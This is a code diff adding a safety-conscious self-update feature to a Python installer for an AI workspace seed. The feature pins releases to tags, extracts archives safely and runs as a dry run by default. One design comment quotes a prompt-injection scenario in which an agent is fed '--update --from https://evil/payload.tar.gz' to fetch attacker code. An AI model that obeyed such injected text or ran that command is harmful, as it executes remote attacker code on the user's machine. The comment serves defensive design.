@@ -40,7 +40,10 @@ import shutil
 import stat
 import subprocess
 import sys
+import tarfile
 import tempfile
+import urllib.error
+import urllib.request
 from datetime import datetime, timezone
 from pathlib import Path
 
@@ -689,6 +692,11 @@ def install(target: Path, into: bool = False):
     receipt["install"]["components"] = written
     receipt["install"]["registered_skills"] = registered_skills
     receipt["install"]["default_jobs"] = default_jobs
+    # SEED-076: snapshot exactly what THIS install wrote, scoped to `written`
+    # (never a skipped-as-satisfied-by-existing component) — so --update has
+    # real per-file history from day one and never needs the historical-
+    # commit-fetch legacy-bootstrap fallback for anything installed from here on.
+    receipt["shipped"] = _shipped_snapshot(target, written + ROOT_FILES)
     _save_receipt(target, receipt)
 
     mode = "composed into your existing workspace at" if into else "->"
@@ -723,6 +731,40 @@ def _shipped_skill_names() -> list:
     (HERE / "skills") — used for the pre-write --into collision check, since
     at that point target/skills/ doesn't exist yet to enumerate instead."""
     return [name for name, _ in _iter_skill_dirs(HERE / "skills")]
+
+
+def _register_new_skills(target: Path) -> list:
+    """SEED-076's --update calls this, never _register_skills(): that
+    function's own docstring says its assertion is a fresh-install-only
+    backstop that "must never be the first place a collision is
+    discovered" — true for install(), false for --update, which by design
+    RE-RUNS against a target that already has every previously-shipped
+    skill registered. Calling _register_skills() there crashed on the
+    first live test of this feature (every already-registered skill
+    tripped the "should be impossible" assert). This is the idempotent
+    twin: skip a skill that's already correctly linked, register one
+    that's missing entirely, and treat anything else (a real file sitting
+    where the symlink should be, or a symlink pointing somewhere else) as
+    a conflict to report rather than something to crash or silently
+    overwrite. Returns the list of NEWLY registered skill names."""
+    claude_skills = target / ".claude" / "skills"
+    registered, conflicts = [], []
+    for name, canonical in _iter_skill_dirs(target / "skills"):
+        link_dir = claude_skills / name
+        link = link_dir / "SKILL.md"
+        want_target = os.path.relpath(canonical, link_dir)
+        if link.is_symlink() and os.readlink(link) == want_target:
+            continue  # already correctly registered — nothing to do
+        if link.exists() or link.is_symlink():
+            conflicts.append(name)
+            continue
+        link_dir.mkdir(parents=True, exist_ok=True)
+        link.symlink_to(want_target)
+        registered.append(name)
+    if conflicts:
+        print(f"update: {len(conflicts)} skill link(s) exist but don't point where expected — "
+             f"left alone, review by hand: {', '.join(conflicts)}", file=sys.stderr)
+    return registered
 
 
 def _register_skills(target: Path) -> list:
@@ -2490,6 +2532,407 @@ def do_audit(target: Path, package: Path, as_json: bool) -> int:
     return exit_code
 
 
+# --- SEED-076: --update — let an existing install adopt later cc-seed content ---
+#
+# Every install() to date is a one-time snapshot: nothing in this file could
+# ever pull LATER cc-seed improvements onto an already-installed target.
+# Found 2026-08-15 auditing why a real install ({{REDACTED}}) was silently 29h
+# stale on a memory-mesh bugfix with no update path at all.
+#
+# Design reviewed by a 3-model panel (grok-4.6/gpt-5.6-terra/gemini-pro,
+# 2026-08-15) before any of this was written — every one of the choices
+# below is a direct response to a finding they raised, not a guess:
+#   - fetch is pinned to an IMMUTABLE git tag (never `main`/HEAD) — grok and
+#     openai both flagged "unsigned fetch of mutable main" as a straight
+#     regression against this file's own SHA256SUMS+signature bar elsewhere
+#     (the pack import path). Full detached-signature verification of a
+#     seed release is real, separate follow-on work (not done here — see
+#     BACKLOG.md SEED-076); this closes the worse half of that gap (mutable
+#     -> immutable) now.
+#   - `--from` accepts ONLY a local path or nothing (pinned default);
+#     arbitrary URLs are refused outright (Gemini: an agent whose context
+#     got prompt-injected with "--update --from https://evil/payload.tar.gz"
+#     would otherwise get a straight RCE, since scheduler/skills/_lib are
+#     executable content this installer writes unattended).
+#   - legacy installs with no recorded per-file "shipped" hash are NEVER
+#     assumed pristine (all three panelists independently: doing so would
+#     silently overwrite exactly the local customization this feature
+#     promises to protect). Bootstrapped from the exact historical commit
+#     recorded in receipt.json if resolvable; every existing path is
+#     reported SKIP (never silently touched) if it isn't.
+#   - detection is unconditional and free; writing anything requires
+#     `--apply` (mirrors --apply-proposal's own naming/shape rather than
+#     inventing a `--yes`), matching Principle 17 (show what you're
+#     approving) and this file's existing pattern for every other gated
+#     write.
+#   - tar extraction validates every member path stays under the
+#     destination before anything touches disk (path-traversal; Gemini
+#     named CVE-2007-4559 directly).
+#   - a target-scoped advisory lock serializes concurrent --update runs
+#     (does NOT yet serialize against --approve/--apply-proposal racing at
+#     the same time — named as a residual below, not silently dropped).
+
+UPDATE_SOURCE_OWNER = "{{REDACTED}}"
+UPDATE_SOURCE_REPO = "ai-os-seed"
+_UPDATE_MAX_BYTES = 50 * 1024 * 1024  # dist/ is a few MB; bound the fetch (Principle 8)
+_UPDATE_FETCH_TIMEOUT = 30
+SHIPPED_PATHS = COMPONENTS + ROOT_FILES  # the exact surface install() itself writes
+# Paths install() WRITES but does not simply copy verbatim — it mutates them
+# post-copy (scheduler/manifest.yml gets the operator's live job list
+# spliced in by _add_job/_install_default_jobs). Found live in this
+# session's own drill: a naive --update overwrite of manifest.yml replaced
+# the operator's scheduled repo_hygiene/freshness jobs with the empty
+# `jobs: []` the seed ships, which would have silently de-scheduled every
+# real job on the next update. --update reports these but NEVER auto-writes
+# them — reconciling scheduler entries stays a manual, by-hand act.
+UPDATE_MANUAL_ONLY_PATHS = {"scheduler/manifest.yml"}
+
+
+def _update_lock_path(target: Path) -> Path:
+    return target / CC_SEED_DIR / ".update.lock"
+
+
+@contextlib.contextmanager
+def _update_lock(target: Path):
+    """O_EXCL advisory lock for the duration of one --update run. Only
+    serializes --update against itself; it does NOT yet serialize against
+    --approve / --apply-proposal running concurrently on the same target —
+    a named residual (BACKLOG.md SEED-076), not a silent gap."""
+    p = _update_lock_path(target)
+    p.parent.mkdir(parents=True, exist_ok=True)
+    try:
+        fd = os.open(str(p), os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
+    except FileExistsError:
+        raise SystemExit(
+            f"update: {p} already exists — another --update looks to be running "
+            f"against this target (or one crashed and left the lock behind; remove "
+            f"it by hand once you've confirmed nothing is actually in flight)")
+    os.write(fd, f"{os.getpid()} {_now()}\n".encode())
+    os.close(fd)
+    try:
+        yield
+    finally:
+        p.unlink(missing_ok=True)
+
+
+def _fetch_url(url: str) -> bytes:
+    """GET url, bounded (Principle 8) and timed out. Raises RuntimeError
+    with a caller-facing message on any failure — never returns a partial
+    or unbounded body."""
+    req = urllib.request.Request(url, headers={"User-Agent": "cc-seed-installer"})
+    try:
+        with urllib.request.urlopen(req, timeout=_UPDATE_FETCH_TIMEOUT) as r:
+            data = r.read(_UPDATE_MAX_BYTES + 1)
+    except (urllib.error.URLError, OSError, TimeoutError) as e:
+        raise RuntimeError(f"could not fetch {url}: {e}")
+    if len(data) > _UPDATE_MAX_BYTES:
+        raise RuntimeError(f"{url} exceeded the {_UPDATE_MAX_BYTES}-byte fetch cap — refusing")
+    if not data:
+        raise RuntimeError(f"{url} returned an empty body")
+    return data
+
+
+def _safe_extract_tar(data: bytes, dest: Path) -> Path:
+    """Extract a .tar.gz into dest, refusing any member whose resolved path
+    would land outside dest (path traversal / CVE-2007-4559 — Gemini's
+    finding) and any symlink/hardlink/device member outright (a seed
+    archive has no legitimate reason to ship one). Returns the single
+    top-level directory GitHub's archive wraps everything in — found
+    generically (exactly one top-level entry, and it must be a directory)
+    rather than assumed by name, because the naming GitHub picks for a
+    given ref is not itself something to trust guessing (grok's review:
+    "ambiguous root must fail, not guess")."""
+    dest.mkdir(parents=True, exist_ok=True)
+    dest_r = dest.resolve()
+    import io
+    with tarfile.open(fileobj=io.BytesIO(data), mode="r:gz") as tf:
+        for m in tf.getmembers():
+            if m.issym() or m.islnk() or m.isdev():
+                raise RuntimeError(f"update source archive: refusing symlink/hardlink/device "
+                                   f"member {m.name!r}")
+            target_path = (dest / m.name).resolve()
+            if target_path != dest_r and dest_r not in target_path.parents:
+                raise RuntimeError(f"update source archive: member {m.name!r} escapes the "
+                                   f"extraction directory — refusing to extract")
+        tf.extractall(dest)  # safe: every member already validated above
+    top = [p for p in dest.iterdir()]
+    if len(top) != 1 or not top[0].is_dir():
+        raise RuntimeError(f"update source archive: expected exactly one top-level directory, "
+                           f"found {[p.name for p in top] or 'none'} — refusing to guess the root")
+    return top[0]
+
+
+def _version_key(v: str):
+    """Best-effort ordering for 'X.Y.Z[-suffix]' version strings: numeric
+    prefix compares first, and any pre-release suffix sorts BELOW the same
+    numeric prefix with no suffix (so 0.2.6-alpha < 0.2.6). Not full semver
+    (no suffix-vs-suffix ordering) — sufficient for refusing an accidental
+    downgrade, which is all this is used for."""
+    m = re.match(r"^(\d+(?:\.\d+)*)(.*)$", v.strip())
+    if not m:
+        return ((), v)  # unparseable — sorts by raw string, never crashes
+    nums = tuple(int(x) for x in m.group(1).split("."))
+    suffix = m.group(2)
+    return (nums, 0 if not suffix else -1)
+
+
+def _fetch_ref_tree(ref: str, tmp_parent: Path) -> Path:
+    """Fetch+extract an immutable ref (a tag OR a commit sha — GitHub's
+    archive endpoint accepts both identically) from the pinned source repo.
+    Never accepts a branch name — that's the one thing this function
+    exists to make impossible to pass in by accident."""
+    if ref in ("main", "master", "HEAD") or "/" in ref:
+        raise RuntimeError(f"refusing to fetch update source by mutable/unsafe ref {ref!r}")
+    url = (f"https://github.com/{UPDATE_SOURCE_OWNER}/{UPDATE_SOURCE_REPO}"
+           f"/archive/{ref}.tar.gz")
+    data = _fetch_url(url)
+    dest = tmp_parent / f"extract-{ref.replace('/', '_')}"
+    return _safe_extract_tar(data, dest)
+
+
+def _resolve_update_source(explicit_from: str, tmp_parent: Path):
+    """Returns (tree: Path, version: str, source_desc: str).
+
+    `explicit_from`: a LOCAL PATH only (an operator-trusted seed clone/dist,
+    e.g. for offline use or testing) — never a URL. With no --from, the
+    pinned default: read VERSION off `main` (a small text read, not
+    executable content — the ACTUAL payload is never taken from main) then
+    fetch that exact version's tag archive, which IS immutable and content-
+    addressed. If that tag doesn't exist yet (e.g. the first publish after
+    this feature shipped, before publish.sh started tagging), this fails
+    with a clear message rather than silently falling back to main."""
+    if explicit_from:
+        tree = Path(explicit_from).expanduser().resolve()
+        if not tree.is_dir():
+            raise RuntimeError(f"--from {explicit_from!r} is not a directory")
+        vf = tree / "VERSION"
+        version = vf.read_text().strip() if vf.exists() else "unknown"
+        return tree, version, f"local:{tree}"
+    if explicit_from == "":
+        raise RuntimeError("--from given but empty")
+    version_url = (f"https://raw.githubusercontent.com/{UPDATE_SOURCE_OWNER}/"
+                   f"{UPDATE_SOURCE_REPO}/main/VERSION")
+    version = _fetch_url(version_url).decode("utf-8", "replace").strip()
+    if not version or "/" in version or "\n" in version:
+        raise RuntimeError(f"implausible VERSION read from {version_url}: {version!r}")
+    tag = f"v{version}"
+    tree = _fetch_ref_tree(tag, tmp_parent)
+    return tree, version, f"{UPDATE_SOURCE_OWNER}/{UPDATE_SOURCE_REPO}@{tag}"
+
+
+def _shipped_snapshot(tree: Path, paths=None) -> dict:
+    """{relpath: {"type": ..., "hash": "sha256:..."}} for every path under
+    `paths` (default SHIPPED_PATHS = the exact surface install() writes) in
+    `tree`. install() passes its own `written` list explicitly — a --into
+    compose install that SKIPPED a component (e.g. the user's own pre-
+    existing memory/) must never have that component snapshotted as
+    'shipped by us', or a future --update could offer to overwrite content
+    that was never ours. Symlinks are recorded by target, never followed;
+    over-cap files get hash=None (still enumerated, per the same
+    bound-the-loop-not-the-coverage discipline _capture_baseline already
+    uses)."""
+    snap = {}
+    for comp in (paths if paths is not None else SHIPPED_PATHS):
+        root = tree / comp
+        if not root.exists():
+            continue
+        paths = [root] if root.is_file() else sorted(root.rglob("*"))
+        for p in paths:
+            rel = p.relative_to(tree).as_posix()
+            st = p.lstat()
+            entry = {"type": _lstat_type(st)}
+            if entry["type"] == "symlink":
+                entry["symlink_target"] = os.readlink(p)
+            elif entry["type"] == "file":
+                entry["hash"] = _sha256_file(p) if st.st_size <= _MAX_HASH_BYTES else None
+            snap[rel] = entry
+    return snap
+
+
+def _reconstruct_legacy_shipped(receipt: dict, tmp_parent: Path):
+    """For an install with no receipt["shipped"] yet (everything installed
+    before SEED-076): the only honest way to know what was ORIGINALLY
+    shipped at each path is to fetch that exact historical commit and
+    snapshot it — receipt["install"]["installer_commit"] already records
+    it. Returns a shipped-snapshot dict, or None if the commit is unknown
+    or can't be fetched (caller must then treat every existing path as
+    unknown/dirty — NEVER assume pristine; see the SEED-076 header note)."""
+    commit = (receipt.get("install") or {}).get("installer_commit")
+    if not commit or commit == "unknown":
+        return None
+    try:
+        tree = _fetch_ref_tree(commit, tmp_parent)
+    except RuntimeError:
+        return None
+    return _shipped_snapshot(tree)
+
+
+def _plan_update(target: Path, shipped_now: dict, new_tree: Path):
+    """Three-way plan: for every path the NEW tree would ship, decide
+    create / update / skip_dirty / manual_only / unchanged. `shipped_now` is
+    the reference "what did we last know we shipped here" snapshot — either
+    receipt["shipped"] (normal case) or a freshly-reconstructed one
+    (legacy bootstrap) or {} (no history at all -> everything existing is
+    dirty by definition, nothing to compare against)."""
+    plan = {"create": [], "update": [], "skip_dirty": [], "manual_only": [], "unchanged": []}
+    new_snap = _shipped_snapshot(new_tree)
+    for rel, new_entry in sorted(new_snap.items()):
+        live = target / rel
+        if not live.exists() and not live.is_symlink():
+            if rel in UPDATE_MANUAL_ONLY_PATHS:
+                continue  # doesn't exist yet -> nothing install() would have synthesized either
+            plan["create"].append(rel)
+            continue
+        if rel in UPDATE_MANUAL_ONLY_PATHS:
+            plan["manual_only"].append(rel)
+            continue
+        st = live.lstat()
+        live_type = _lstat_type(st)
+        live_hash = None
+        if live_type == "file" and st.st_size <= _MAX_HASH_BYTES:
+            live_hash = _sha256_file(live)
+        was = shipped_now.get(rel)
+        is_pristine = (was is not None and was.get("type") == live_type
+                       and (live_type != "file" or was.get("hash") == live_hash))
+        if new_entry.get("type") == live_type and (
+                live_type != "file" or new_entry.get("hash") == live_hash):
+            plan["unchanged"].append(rel)
+        elif is_pristine:
+            plan["update"].append(rel)
+        else:
+            plan["skip_dirty"].append(rel)
+    return plan, new_snap
+
+
+def _apply_update(target: Path, receipt: dict, new_tree: Path, plan: dict, new_snap: dict):
+    """Copy every create/update-planned path in, then refresh
+    receipt["shipped"] for exactly the paths just written — never for
+    skip_dirty paths (those keep whatever shipped record they already had,
+    so a future run keeps comparing them against the SAME historical
+    reference rather than the new one they were never actually updated
+    to)."""
+    for rel in plan["create"] + plan["update"]:
+        src = new_tree / rel
+        dst = target / rel
+        entry = new_snap[rel]
+        if entry["type"] == "dir":
+            dst.mkdir(parents=True, exist_ok=True)
+            continue
+        dst.parent.mkdir(parents=True, exist_ok=True)
+        if entry["type"] == "symlink":
+            if dst.exists() or dst.is_symlink():
+                dst.unlink()
+            os.symlink(entry["symlink_target"], dst)
+        else:
+            if dst.exists() or dst.is_symlink():
+                dst.unlink()
+            shutil.copy2(src, dst)
+    shipped = dict(receipt.get("shipped") or {})
+    for rel in plan["create"] + plan["update"]:
+        shipped[rel] = new_snap[rel]
+    receipt["shipped"] = shipped
+
+
+def do_update(target: Path, from_arg: str, apply: bool, allow_downgrade: bool) -> int:
+    if not looks_like_install(target):
+        return die(f"{target} doesn't look like an AI-OS Seed install (no PRINCIPLES.md + "
+                   f"scheduler/manifest.yml) — --update only operates on an existing install")
+    receipt = _load_receipt(target)
+    if receipt is None:
+        return die(f"{target}: no {CC_SEED_DIR}/{RECEIPT_NAME} — this install predates receipts "
+                   f"entirely (pre-Wave-2H) and --update has no baseline to reason from safely; "
+                   f"reinstall fresh into a new directory instead")
+    with _update_lock(target):
+        with tempfile.TemporaryDirectory(prefix="cc-seed-update-") as tmp:
+            tmp_p = Path(tmp)
+            try:
+                new_tree, new_version, source_desc = _resolve_update_source(from_arg, tmp_p)
+            except RuntimeError as e:
+                return die(f"update: {e}")
+            current_version = ((receipt.get("install") or {}).get("installer_version")
+                               or _installer_version_of(target))
+            if (current_version not in (None, "unknown") and new_version != "unknown"
+                    and _version_key(new_version) < _version_key(current_version)
+                    and not allow_downgrade):
+                return die(f"update: fetched version {new_version!r} is OLDER than the "
+                          f"installed {current_version!r} — refusing (pass --allow-downgrade "
+                          f"if this is deliberate, e.g. --from a specific local clone)")
+            if new_version != "unknown" and new_version == current_version:
+                print(f"update: already current (version {current_version}) — nothing to do.")
+                return 0
+
+            shipped_now = receipt.get("shipped")
+            bootstrapped = False
+            if shipped_now is None:
+                shipped_now = _reconstruct_legacy_shipped(receipt, tmp_p)
+                if shipped_now is None:
+                    print("update: no per-file 'shipped' history on this receipt, and the "
+                          "recorded installer_commit couldn't be fetched to reconstruct one — "
+                          "every existing shipped path will be treated as unverified and "
+                          "SKIPPED (only genuinely NEW paths will be created). Run again once "
+                          "network/commit access is available to get real update coverage.",
+                          file=sys.stderr)
+                    shipped_now = {}
+                else:
+                    bootstrapped = True
+                    print(f"update: no receipt['shipped'] history — reconstructed it by "
+                          f"fetching this install's original commit "
+                          f"({receipt['install'].get('installer_commit', '?')[:12]}) for "
+                          f"comparison.")
+
+            plan, new_snap = _plan_update(target, shipped_now, new_tree)
+            print(f"update: {source_desc} (version {new_version}) vs installed "
+                  f"{current_version or 'unknown'}")
+            print(f"  {len(plan['create'])} to create, {len(plan['update'])} to update, "
+                  f"{len(plan['skip_dirty'])} skipped (locally modified or unverified), "
+                  f"{len(plan['manual_only'])} needs manual review, "
+                  f"{len(plan['unchanged'])} already current")
+            for rel in plan["create"]:
+                print(f"  [CREATE] {rel}")
+            for rel in plan["update"]:
+                print(f"  [UPDATE] {rel}")
+            for rel in plan["skip_dirty"]:
+                print(f"  [SKIP  ] {rel} — locally modified since install, not touched")
+            for rel in plan["manual_only"]:
+                print(f"  [MANUAL] {rel} — install() writes this file itself (e.g. your live "
+                     f"scheduled jobs); --update never touches it automatically. Compare it "
+                     f"by hand against the new tree if you want anything it added.")
+
+            if not apply:
+                print("\n(dry run — pass --apply to write these changes)")
+                return 0
+            if not plan["create"] and not plan["update"]:
+                print("\nnothing to apply.")
+                if bootstrapped:
+                    receipt["shipped"] = shipped_now
+                    _save_receipt(target, receipt)
+                return 0
+
+            _apply_update(target, receipt, new_tree, plan, new_snap)
+            newly_registered = _register_new_skills(target)
+            updates = receipt.get("updates") or []
+            updates.append({
+                "at": _now(), "from_version": current_version, "to_version": new_version,
+                "source": source_desc, "created": plan["create"], "updated": plan["update"],
+                "skipped_dirty": plan["skip_dirty"], "bootstrapped_shipped_history": bootstrapped,
+            })
+            receipt["updates"] = updates
+            receipt["install"]["installer_version"] = new_version
+            _save_receipt(target, receipt)
+            print(f"\napplied: {len(plan['create'])} created, {len(plan['update'])} updated. "
+                 f"{len(plan['skip_dirty'])} locally-modified path(s) left untouched — review "
+                 f"the SKIP list above if any of those needed the update too.")
+            if newly_registered:
+                print(f"registered {len(newly_registered)} new skill(s): "
+                     f"{', '.join(newly_registered)}")
+            return 0
+
+
+def _installer_version_of(target: Path) -> str:
+    vf = target / "VERSION"
+    return vf.read_text().strip() if vf.exists() else "unknown"
+
+
 def main():
     ap = argparse.ArgumentParser(description=__doc__)
     ap.add_argument("--target", help="install root (absolute path)")
@@ -2563,6 +3006,21 @@ def main():
     ap.add_argument("--revert-proposal", metavar="SLUG",
                     help="undo a previously-applied proposal, refusing if the target has "
                          "changed since --apply-proposal ran")
+    ap.add_argument("--update", action="store_true",
+                    help="SEED-076: check this install against the latest published cc-seed "
+                         "content (pinned to an immutable release tag — never a mutable "
+                         "branch). Reports create/update/skip-as-locally-modified for every "
+                         "shipped path and writes NOTHING unless --apply is also given.")
+    ap.add_argument("--from", dest="update_from", metavar="PATH",
+                    help="with --update: a LOCAL seed clone/dist directory to update from "
+                         "instead of fetching the pinned release — never a URL. For offline "
+                         "use or testing against an unpublished build you already trust.")
+    ap.add_argument("--apply", action="store_true",
+                    help="with --update: actually write the planned changes (default is a "
+                         "dry-run report only)")
+    ap.add_argument("--allow-downgrade", action="store_true",
+                    help="with --update: permit installing a version OLDER than what's "
+                         "currently installed (refused by default)")
     args = ap.parse_args()
 
     if args.detect:
@@ -2579,11 +3037,11 @@ def main():
         return die(f"--target must be an absolute path, got {args.target!r}")
     exclusive = [args.enable_demo, args.enable_governance, args.uninstall, args.approve, args.audit,
                  args.list_packs, bool(args.remove_pack), bool(args.set_engagement),
-                 bool(args.apply_proposal), bool(args.revert_proposal)]
+                 bool(args.apply_proposal), bool(args.revert_proposal), args.update]
     if sum(bool(x) for x in exclusive) > 1:
         return die("--enable-demo, --enable-governance, --uninstall, --approve, --audit, "
-                   "--list-packs, --remove-pack, --set-engagement, --apply-proposal, and "
-                   "--revert-proposal are mutually exclusive")
+                   "--list-packs, --remove-pack, --set-engagement, --apply-proposal, "
+                   "--revert-proposal, and --update are mutually exclusive")
     if args.into and any(exclusive):
         return die("--into only applies to the initial install")
     if args.json and not args.audit:
@@ -2604,7 +3062,15 @@ def main():
         return die("--force only applies to --set-engagement")
     if args.approve == "import-pack" and not args.from_pack:
         return die("--approve import-pack requires --from-pack <path>")
+    if args.update_from and not args.update:
+        return die("--from only applies to --update")
+    if args.apply and not args.update:
+        return die("--apply only applies to --update")
+    if args.allow_downgrade and not args.update:
+        return die("--allow-downgrade only applies to --update")
 
+    if args.update:
+        return do_update(target, args.update_from, args.apply, args.allow_downgrade)
     if args.uninstall:
         return uninstall(target)
     if args.enable_demo:
